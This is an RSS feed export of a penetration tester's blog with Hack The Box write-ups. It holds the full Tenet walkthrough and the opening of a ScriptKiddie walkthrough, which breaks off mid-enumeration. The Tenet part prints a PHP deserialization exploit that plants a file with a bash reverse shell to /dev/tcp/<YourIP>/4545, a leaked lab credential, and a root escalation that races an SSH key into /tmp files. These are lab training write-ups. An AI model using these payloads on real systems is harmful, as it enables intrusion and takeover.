<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[h4rithd.com]]></title><description><![CDATA[Penetration Tester | Ethical Hacker | Security Researcher]]></description><link>https://h4rithd.com/blog/</link><image><url>https://h4rithd.com/blog/favicon.png</url><title>h4rithd.com</title><link>https://h4rithd.com/blog/</link></image><generator>Ghost 4.6</generator><lastBuildDate>Sat, 12 Jun 2021 15:25:22 GMT</lastBuildDate><atom:link href="https://h4rithd.com/blog/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Tenet Walkthrough]]></title><description><![CDATA[This machine is rated as medium, but to get foothold I had to be stuck for one and half hour. The machine contains PHP Object Deserial...]]></description><link>https://h4rithd.com/blog/tenet-walkthrough/</link><guid isPermaLink="false">60c0b3dbc9542c401b620508</guid><category><![CDATA[Retired Machines HTB]]></category><category><![CDATA[Tenet Walkthrough]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Harith Dilshan]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Fri, 11 Jun 2021 19:00:00 GMT</pubDate><media:content url="https://h4rithd.com/blog/content/images/2021/06/tenet.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://h4rithd.com/blog/content/images/2021/06/tenet.jpg" alt="Tenet Walkthrough"><p>Tenet has been retired !!! Well, that part is little dramatic. &#x1F609;&#x1F609;</p><hr><p>This machine is rated as medium, but to get foothold I had to be stuck for one and half hour. The machine contains PHP Object Deserialization vulnerability and also PrivEsc which is so simple if you can understand the shell codes. Hope you will like it. &#x1F60A;&#x1F60A;</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as in usual writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</blockquote><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><!--kg-card-end: html--><hr><h2 id="01-enumeration">01 Enumeration</h2><p>First of all I will check the status of my VPN connection and whether the machine is alive or not. To do that we can simply ping to the IP address like this &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-296.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1454" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-296.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-296.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-296.png 1454w" sizes="(min-width: 720px) 720px"></figure><p>As you can see here, the <strong>TTL value is 63</strong>. That implies this machine is Linux.</p><p>As we did every time, let&apos;s begin with Nmap. For that I need to know which ports are open. So, run fast scan for all TCP ports.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.223 </code></pre><p>Here is the output &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-297.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1654" height="1106" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-297.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-297.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-297.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-297.png 1654w" sizes="(min-width: 720px) 720px"></figure><p>So, there are only two open ports. &#x1F914;&#x1F914;</p><h3 id="011-run-nmap-scripting-engine">01.1 Run Nmap Scripting Engine</h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore, we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 22,80 10.10.10.223</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-298.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1934" height="922" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-298.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-298.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-298.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-298.png 1934w" sizes="(min-width: 720px) 720px"></figure><p>By looking at the SSH service info, we can definitely say that the Operating System is <strong>Ubuntu </strong>and &#xA0;<a href="https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.3" rel="noopener noreferrer">launchpad</a> information shows us the flavor is <strong>Bionic Beaver </strong>&#x1F43F;&#x1F43F;</p><p>So as usual, there is a webserver running on port 80. First, I will choose that port to go on further enumerations. Open whatever web browser you like and navigate to <em>http://10.10.10.223/</em></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-299.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1717" height="911" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-299.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-299.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-299.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-299.png 1717w" sizes="(min-width: 720px) 720px"></figure><p>You can see here that it is a default apache index page. Well, then we need brute force directories to identify if there are any other endpoints. I used to use <a href="https://github.com/maurosoria/dirsearch" rel="noopener noreferrer">dirsearch</a> tool before, but right now I&apos;m using <a href="https://github.com/ffuf/ffuf" rel="noopener noreferrer">ffuf</a> tool because it has more power than other tools. In addition to doing directory brute force, we can also use this for credentials brute force and subdomain discovery.</p><p>Use following command for brute force directories. &#x1F447;&#x1F447;</p><pre><code class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.223/FUZZ</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-300.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="2000" height="1106" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-300.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-300.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-300.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-300.png 2196w" sizes="(min-width: 720px) 720px"></figure><p>And we found one valid endpoint called <code>wordpress</code> . Let&apos;s navigate to that endpoint.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-301.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1519" height="665" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-301.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-301.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-301.png 1519w" sizes="(min-width: 720px) 720px"></figure><p>This is what I got. Let&apos;s take a moment to look at the source code. Press <code>ctrl + u</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-302.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1429" height="232" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-302.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-302.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-302.png 1429w" sizes="(min-width: 720px) 720px"></figure><pre><code class="language-bash">echo -e &quot;10.10.10.223\ttenet.htb&quot; &gt;&gt; /etc/hosts</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-303.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1108" height="332" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-303.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-303.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-303.png 1108w" sizes="(min-width: 720px) 720px"></figure><p>And then navigate to the <strong>http://tenet.htb/</strong></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-304.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1712" height="843" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-304.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-304.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-304.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-304.png 1712w" sizes="(min-width: 720px) 720px"></figure><p>After doing some searching around the page, I found some interesting thing like this. &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-305.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="796" height="294" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-305.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-305.png 796w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-306.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="724" height="280" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-306.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-306.png 724w" sizes="(min-width: 720px) 720px"></figure><p>With that point I had to get stuck for an hour and a half to find the next step.</p><p>Finally, here is another subdomain called <code>sator.tenet.htb</code> . Edit your host file again. &#x1F447;&#x1F447;</p><pre><code class="language-bash">echo -e &quot;10.10.10.223\tsator.tenet.htb&quot; &gt;&gt; /etc/hosts</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-307.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1456" height="370" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-307.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-307.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-307.png 1456w" sizes="(min-width: 720px) 720px"></figure><p>Don&apos;t be lazy &#x1F913; now navigate to the <code>sator.tenet.htb</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-308.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1710" height="800" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-308.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-308.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-308.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-308.png 1710w" sizes="(min-width: 720px) 720px"></figure><p>Ah ha! &#x1F4A1; I know how the game is like now based on Neil&apos;s comment which we met earlier. Therefore navigate again <code>http://sator.tenet.htb/sator.php</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-309.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="551" height="165"></figure><p>Neil is talking about the backup file. Okay then, let&apos;s check <code>sator.php.bak</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-310.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="906" height="529" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-310.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-310.png 906w" sizes="(min-width: 720px) 720px"></figure><p>Yeah! &#x1F64C; we have the backup file now. Let&apos;s download that file to our host machine and try to open that file.</p><pre><code class="language-bash">wget http://sator.tenet.htb/sator.php.bak</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-311.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1940" height="662" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-311.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-311.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-311.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-311.png 1940w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-312.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1782" height="1324" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-312.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-312.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-312.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-312.png 1782w" sizes="(min-width: 720px) 720px"></figure><p>Damn it.&#x1F629; There is PHP deserialization vulnerability. In fact, I&apos;m very weak when it comes PHP deserialization. Somehow, by analyzing the source code and using following articles, I was able to create the payload and it works.&#x1F601;&#x1F601;</p><ul><li><a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a" rel="noopener noreferrer">Exploiting PHP deserialization.</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Files/PHP-Serialization-RCE-Exploit.php" rel="noopener noreferrer">PHP Serialization RCE Exploit</a></li></ul><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-313.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="600" height="283" srcset="https://h4rithd.com/blog/content/images/2021/06/image-313.png 600w"></figure><hr><h2 id="02-foothold">02. Foothold</h2><p>The payload will look like this. &#x1F447;&#x1F447; Change <strong>YourIP</strong> as yours.</p><pre><code class="language-bash">&lt;?php

class DatabaseExport {
  public $user_file = &apos;h4rithd.php&apos;;
  public $data = &apos;&lt;?php exec(&quot;/bin/bash -c \&apos;bash -i &gt; /dev/tcp/&lt;YourIP&gt;/4545 0&gt;&amp;1\&apos;&quot;); ?&gt;&apos;;
  }

$payload = &apos;http://sator.tenet.htb/sator.php?arepo=&apos;.urlencode(serialize(new DatabaseExport));

system(&apos;curl &apos;.$payload);
system(&apos;curl http://sator.tenet.htb/h4rithd.php&apos;);

?&gt;</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-314.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1988" height="700" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-314.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-314.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-314.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-314.png 1988w" sizes="(min-width: 720px) 720px"></figure><p>Now power up netcat listener and listen to port 4545. After that, we can run the above payload by typing <code>php payload.php</code> on the terminal. Then you will land on a reverse shell as user <code>www-data</code> &#x1F924;&#x1F924;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-315.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1509" height="270" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-315.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-315.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-315.png 1509w" sizes="(min-width: 720px) 720px"></figure><p>OK! Now you will find a way to escalate the privilege&apos;s in order to read the user flag by doing some quick enumerations on wordpress directory.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-316.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1600" height="442" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-316.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-316.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-316.png 1600w" sizes="(min-width: 720px) 720px"></figure><p>In the <code>wp-config.php</code> file, disclose the credentials for user neil. <code>neil : Opera2112</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-317.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1332" height="516" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-317.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-317.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-317.png 1332w" sizes="(min-width: 720px) 720px"></figure><p>Now we can use the &#x261D; above credentials to login as user <code>neil</code> via SSH. Then you have the user.txt.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-318.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1772" height="1324" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-318.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-318.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-318.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-318.png 1772w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="03-privilege-escalation">03. Privilege Escalation</h2><p>For privilege escalation, usually I run the <code>sudo-l</code> command first to know what commands we can run as super user without prompting the super user password.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-319.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1730" height="478" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-319.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-319.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-319.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-319.png 1730w" sizes="(min-width: 720px) 720px"></figure><p>As shown, there is a bash file located in <code>/usr/local/bin/enableSSH.sh</code> Let&apos;s check the file permission first.</p><pre><code class="language-bash">ls -al /usr/local/bin/enableSSH.sh</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-320.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1510" height="294" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-320.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-320.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-320.png 1510w" sizes="(min-width: 720px) 720px"></figure><p>We have permission only to <code>read and execute</code> &#xA0;on this file. Let&apos;s check what&apos;s inside that file. &#x1F9D0;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-321.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="2000" height="1292" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-321.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-321.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-321.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-321.png 2334w" sizes="(min-width: 720px) 720px"></figure><p>While analyzing the source I found a pretty interesting function called <strong>addKey().</strong></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-322.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1500" height="588" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-322.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-322.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-322.png 1500w" sizes="(min-width: 720px) 720px"></figure><p>Simply what it does is, the script reads the content of the file in <code>/tmp/ssh-xxxxxx</code> and adds it to the <code>/root/.ssh/authorized_keys</code> . If we can add our SSH public key to the <code>/tmp/ssh-XXXXXX</code> ; we can login to the machine as root via our private key.</p><p>In doing so, I need to have SSH key pair. Let&apos;s generate it right now. Type <code>ssh-keygen</code> and hit enter.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-323.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1894" height="1030" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-323.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-323.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-323.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-323.png 1894w" sizes="(min-width: 720px) 720px"></figure><p>Then we need to write our public key to the <code>/tmp/ssh-*</code> continuously. We can do that using a simple bash loop. Change<strong> &lt;Your_id_rsa.pub&gt; </strong>as yours.</p><pre><code class="language-bash">while true
do 
echo &apos;ssh-rsa AAAAB**&lt;Your_id_rsa.pub&gt;***p1c=&apos; |tee /tmp/ssh-*
done</code></pre><p>Now let&apos;s move on to the final step &#x1F605;. I divided my terminal into 3 parts. The top one is to run the loop script, the second one is to execute the enableSSH.sh script and the last one is to login as root via my private key.</p><p>After all, run the loop script, then again run the <strong>enableSSH.sh</strong> script and try to login as root via SSH.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-324.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1319" height="746" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-324.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-324.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-324.png 1319w" sizes="(min-width: 720px) 720px"></figure><p>PWN3D! &#x1F973; Now we have the root flag.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-325.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="1390" height="294" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-325.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-325.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-325.png 1390w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-326.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="851" height="766" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-326.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-326.png 851w" sizes="(min-width: 720px) 720px"></figure><p>I still wonder why this box was given such a name, don&apos;t you??</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-327.png" class="kg-image" alt="Tenet Walkthrough" loading="lazy" width="761" height="318" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-327.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-327.png 761w" sizes="(min-width: 720px) 720px"></figure><p><br>Anyway... I&#x2019;ll see you on the next retired machine, Ciao!! &#x1F609;&#x1F609;</p><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p><p></p><p></p><p></p><p></p>]]></content:encoded></item><item><title><![CDATA[ScriptKiddie Walkthrough]]></title><description><![CDATA[After all ScriptKiddie has been retired, So I'm here for the ScriptKiddies | CVE-2020-7384 Exploit POC explain, without Metasploit ]]></description><link>https://h4rithd.com/blog/scriptkiddie-walkthrough/</link><guid isPermaLink="false">60b76f0bdb31001278752f46</guid><category><![CDATA[ScriptKiddie Walkthrough]]></category><category><![CDATA[CVE-2020-7384]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Harith Dilshan]]></category><category><![CDATA[Retired Machines HTB]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Sat, 05 Jun 2021 16:28:00 GMT</pubDate><media:content url="https://h4rithd.com/blog/content/images/2021/06/ScriptKiddieBG.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://h4rithd.com/blog/content/images/2021/06/ScriptKiddieBG.jpg" alt="ScriptKiddie Walkthrough"><p>After all ScriptKiddie has been retired, So I&apos;m here for the ScriptKiddies &#x1F609;&#x1F609;</p><hr><p>As it is implied in the name of the machine, it&apos;s kinda like CTF. Also in the machine&apos;s matrix on the statistics page will give the characteristics.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-238.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="674" height="491" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-238.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-238.png 674w"></figure><p>The overall experience is so good. Here I explain how to use <strong>CVE-2020-7384</strong> exploit without tackling with Metasploit Framework. <strong>PrivEsc </strong>is so simple if you can understand the shell codes. Hope you will like it. &#x1F60A;&#x1F60A;</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><p><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</p><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><!--kg-card-end: html--><hr><h2 id="01-enumeration">01 Enumeration</h2><p>First of all I will check the status of my VPN connection and whether machine is alive or not. To do that we can simply ping to the IP address like this &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-239.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1492" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-239.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-239.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-239.png 1492w" sizes="(min-width: 720px) 720px"></figure><p>As you can see here, the <strong>TTL value is 63</strong>. That implies this machine is Linux.</p><p>As usual, let&apos;s begin with Nmap. First of all I need to know what ports are open, so run fast scan for all TCP ports.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.226</code></pre><p>Here is the output &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-240.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1868" height="1106" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-240.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-240.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-240.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-240.png 1868w" sizes="(min-width: 720px) 720px"></figure><p>So, there are only two open ports. &#x1F914;&#x1F914;</p><h3 id="011-run-nmap-scripting-engine">01.1 Run Nmap Scripting Engine</h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore, we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 22,5000 10.10.10.226</code></pre><p>Here is the output. &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-241.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1992" height="922" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-241.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-241.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-241.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-241.png 1992w" sizes="(min-width: 720px) 720px"></figure><p>By looking at the SSH service info we can definitely say that the Operating System is <strong>Ubuntu </strong>and &#xA0;<a href="https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4" rel="noopener noreferrer">launchpad</a> information gives us the flavor is <strong>Focal Fossa</strong>. Kind of cute ah!&#x1F609;&#x1F609;</p><p>You can search known exploits for SSH but trust me nothing can be found!.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-242.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1192" height="370" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-242.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-242.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-242.png 1192w" sizes="(min-width: 720px) 720px"></figure><p>Now we have only one port left and it is <strong>5000/tcp</strong>. As in the Nmap results, that port is running a web server called <strong>Werkzeug.</strong></p><blockquote><strong>Werkzeug</strong> is a comprehensive WSGI web application library. It began as a simple collection of various utilities for WSGI applications and has become one of the most advanced WSGI utility libraries. <a href="https://werkzeug.palletsprojects.com/en/2.0.x/#:~:text=Werkzeug%20is%20a%20comprehensive%20WSGI,most%20advanced%20WSGI%20utility%20libraries." rel="noopener noreferrer"><a href="https://werkzeug.palletsprojects.com/en/2.0.x/">source</a></a></blockquote><p>Since it is a webserver, let&apos;s browse using Firefox. You are free to use your own fav browser. But remember! sometimes we need to intercept the web traffic. I have already configured Firefox browser with burp certificate. That&apos;s why I&apos;m using Firefox &#x1F98A;&#x1F98A;</p><p>Open web browser and navigate to<strong> http://10.10.10.226:5000/</strong></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-243.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1586" height="775" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-243.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-243.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-243.png 1586w" sizes="(min-width: 720px) 720px"></figure><p>By looking at the interface, we realize that certainly we have plenty of enumerations here. Isn&apos;t that so mate?? &#x1F926;&#x200D;&#x2642;&#xFE0F;&#x1F926;&#x200D;&#x2642;&#xFE0F;</p><p>After doing a number of enumerations, (LFI,SSRF,RCE etc..) I found the Foothold. &#x1F920;&#x1F920;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-244.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="640" height="1088" 